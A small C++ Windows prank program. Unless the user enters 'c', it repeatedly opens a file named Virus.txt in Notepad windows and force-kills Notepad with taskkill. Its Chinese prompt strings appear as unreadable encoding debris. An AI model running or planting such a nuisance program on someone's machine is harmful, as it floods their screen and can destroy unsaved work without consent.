#include<iostream>
using namespace std;
int main() {
	char key;
	system("echo ���������룺");
	cin>>key;
	switch (key) {
		case 'c':
			cout<<"�ǲݣ�cao����簡~~~~~~~~~"<<endl;
			system("pause");
			return 0;
		default:
			cout<<"��(gui)����������";
			break;
	}
	cout<<"������󣡣�����������ٴ��̣�������";
    for(int m=0;m<200;m++){
		if(m%100==0){
    		system("taskkill -f -im notepad.exe");
		}
    	system("start Virus.txt");
    
	}
	
}
